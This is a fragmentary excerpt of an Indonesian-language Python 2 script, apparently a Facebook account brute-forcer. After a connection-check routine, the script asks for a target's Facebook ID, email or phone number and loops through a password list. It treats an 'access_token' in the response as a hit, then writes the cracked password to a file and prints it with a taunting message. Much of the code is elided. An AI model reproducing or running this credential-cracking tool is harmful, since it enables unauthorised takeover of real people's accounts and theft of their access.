...
def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1m Test koneksi'
        time.sleep(2)
        toolbar_width = 25
        ...
        try:
            ...
            time.sleep(3.5)
            print '\033[37;1m] \033[35;1m~> \033[32;1m Tersambung'
            time.sleep(2.0)
            start()
...
def start():
        try:
            os.system('reset')
            print banner
            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID.FB TARGET\033[36;1m| \033[37;1mEMAIL TARGET\033[36;1m | \033[37;1mNO.HP TARGET \033[31;1m: \033[32;1m')
            ...
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m MEMULAI \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                    sys.stdout.flush()
                    ...
                    if 'access_token' in mpsh:
                        ...
                        dapat.write('[PW]=> ' + pw)
                        dapat.close()
                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD KETEMU WKWKWKW'
                        print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
                        print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m BERHASIL'
                        print '\033[32;1m[=] \033[37;1mSELESAI YA BANGS4T'
                        sys.exit()
                    else:
            ...
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1m PERIKSA KONEKSI INTERNETMU ULANGI LAGI'
            sys.exit()
